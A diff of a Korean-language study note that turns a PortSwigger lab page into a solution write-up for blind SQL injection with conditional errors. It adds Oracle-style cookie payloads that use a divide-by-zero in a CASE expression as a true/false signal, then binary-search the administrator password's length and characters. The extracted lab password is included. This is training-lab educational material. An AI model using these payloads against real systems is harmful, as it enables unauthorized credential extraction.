@@ -5,45 +5,65 @@ tags:
   - sql-injection
 lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors"
 difficulty: Practitioner
-note_kind: problem
+note_kind: solution
+draft: false
 ---
 
 # Blind SQL injection with conditional errors
 
-## 문제 조건과 설명
+## 문제
 
-분석용 추적 쿠키의 값이 서버의 SQL 조회에 들어간다. 조회 결과는 페이지에 나타나지 않고, 조회가 행을 반환했는지에 따라서도 응답이 달라지지 않는다. 대신 **SQL 오류가 발생하면 사용자 지정 오류 메시지**가 나온다. 11번 실습의 `Welcome back`처럼 행의 존재를 알려 주는 신호는 여기서 사용할 수 없다.
+`TrackingId` 쿠키가 SQL 조회에 들어간다. 조회 결과는 화면에 보이지 않지만 SQL 오류가 나면 응답이 달라진다. 주어진 `users(username, password)` 테이블에서 `administrator`의 비밀번호를 알아내 로그인하는 실습이다.
 
-**무엇을 관찰할 수 있나**
+[PortSwigger 실습](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
 
-정상적으로 끝난 조회 두 개는 반환 행이 달라도 같은 응답처럼 보인다. 반면 SQL 실행 중 오류가 나면 정해진 오류 화면이 나타난다. 이 차이를 이용하려면 단순히 문법을 깨뜨리는 데서 그치지 않고, **확인하려는 조건에 따라 오류가 나거나 나지 않도록** 만들 수 있어야 한다. 그때 오류 여부가 조건의 답을 알려 주는 신호가 된다.
+## 풀이 기록
 
-실제 테스트에서는 평상시 요청, 오류를 의도한 요청, 조건을 바꾼 요청을 비교해야 한다. HTTP 상태 코드 하나만 보고 SQL 오류라고 단정하지 않고, 공식 설명이 말한 **사용자 지정 오류 메시지**인지 확인하는 것이 중요하다. 쿠키 이름과 오류 문구의 실제 모습은 문제 설명에 주어지지 않는다.
+### 1. 오류를 참·거짓 신호로 확인
 
-**알려진 테이블과 완료 조건**
+원래 쿠키 값 뒤에 `UNION SELECT`를 붙여 조건이 참일 때만 `1/0`을 계산하도록 했다. `1=2`는 HTTP 200, `1=1`은 HTTP 500이었다. 따라서 이 인스턴스에서는 **500을 참, 200을 거짓**으로 읽을 수 있었다. `TO_CHAR`는 `CASE`의 두 결과를 문자열로 맞춘다.
 
-데이터베이스에 `users` 테이블과 `username`, `password` 열이 있다는 사실은 주어져 있다. 그러나 `administrator`의 비밀번호 값은 숨겨져 있다. **완료 조건은 오류 여부를 이용해 그 비밀번호를 알아낸 다음 관리자 계정으로 로그인하는 것**이다. 비밀번호를 한 번에 화면에서 읽는 방식이 아니므로, 어떤 길이와 문자에 관한 조건을 어떤 응답으로 확인했는지 차례대로 남겨야 한다.
+~~~sql fragment
+<원래 TrackingId>' UNION SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'x' END FROM dual -- -
+~~~
 
-아래 기록에는 실제로 비교한 요청과 오류 응답을 넣는다. 여기까지의 설명은 공식 조건에서 도출한 탐색 방향이며, 특정 값이 참이거나 비밀번호를 알아냈다는 관찰은 아니다.
+시간 분산을 이용하려는 실험에서는 단계 수에 따른 차이가 재현되지 않아 판정 신호로 사용하지 않았다.
 
-출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+### 2. 비밀번호 길이 확인
 
-## 탐색 및 풀이 기록
+`LENGTH(password)`가 중간값보다 큰지 물으며 범위를 절반씩 줄였다. `administrator`의 비밀번호 길이는 **20자**였다.
 
-<!-- 아직 이 실습의 요청·응답을 직접 기록하지 않았다. 오류가 발생한 조건과 발생하지 않은 조건을 확인하면 같은 파일에 이어서 적는다. -->
+~~~sql fragment
+<원래 TrackingId>' UNION SELECT CASE WHEN (
+  (SELECT LENGTH(password) FROM users WHERE username='administrator') > <중간값>
+) THEN TO_CHAR(1/0) ELSE 'x' END FROM dual -- -
+~~~
 
-### 초기 관찰
-<!-- 직접 확인한 내용과 아직 확인하지 못한 점 -->
+### 3. 문자별 ASCII 이진 탐색
 
-### 실행 과정
-<!-- 무엇을 왜 했는지 → 실제 결과 → 해석 -->
-<!-- 필요할 때 코드·요청·응답·스크린샷 첨부 -->
+1번부터 20번 위치까지 `ASCII(SUBSTR(password, 위치, 1))`를 중간값과 비교했다. 각 요청의 200/500 결과에 따라 다음 탐색 범위를 좁혔다.
 
-## 최종 결과
-<!-- 완료 여부와 확인 근거 -->
+~~~sql fragment
+<원래 TrackingId>' UNION SELECT CASE WHEN (
+  (SELECT ASCII(SUBSTR(password, <위치>, 1))
+   FROM users WHERE username='administrator') > <중간값>
+) THEN TO_CHAR(1/0) ELSE 'x' END FROM dual -- -
+~~~
 
-## 배운 점
-<!-- 새로 알게 된 내용, 잘못 생각했던 부분 -->
+추출한 값은 `r1dh0o4d1wwq9nz7lox8`이었다. 비밀번호 전체를 조건으로 다시 물어 **검증 성공**을 확인했다. 요청을 만들 때는 PowerShell의 `CookieContainer` 대신 `Cookie` 헤더를 직접 사용했다.
+
+![비밀번호 길이와 20개 문자를 추출하고 최종 검증한 PowerShell 결과](images/lab-conditional-errors/01-extracted-password.png)
+
+### 4. 관리자 로그인
+
+확인한 비밀번호로 로그인하자 `administrator` 계정 화면에 실습 완료 배너가 표시됐다.
+
+![administrator 로그인 후 실습 완료 화면](images/lab-conditional-errors/02-administrator-solved.png)
+
+## 정리
+
+조회 결과가 숨겨져 있어도 조건에 따라 오류를 발생시키면 응답 상태를 한 비트의 신호로 쓸 수 있다. 먼저 참·거짓 조건의 응답을 확인한 뒤 길이와 문자 값을 차례대로 좁혀 비밀번호를 복원했다.
 
 ## 관련 개념
-<!-- 필요한 개념 노트 링크를 목록으로 추가 -->
+
+- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
